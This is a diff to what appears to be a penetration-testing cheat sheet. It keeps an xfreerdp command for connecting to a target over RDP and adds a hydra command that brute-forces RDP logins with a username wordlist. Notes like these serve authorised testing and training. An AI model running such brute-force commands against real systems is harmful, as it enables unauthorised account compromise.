@@ -133,3 +133,9 @@ Connect with shared folder, and NLA :
 ```bash
 xfreerdp /v:$TARGET_IP /sec:nla /u:$USER /p:$PASSWORD /drive:shared,/home/kali/shared
 ```
+
+Brute force RDP:
+
+```bash
+hydra -L /usr/share/wordlists/dirb/others/names.txt -p $PASSWORD rdp://$TARGET_IP -I
+```
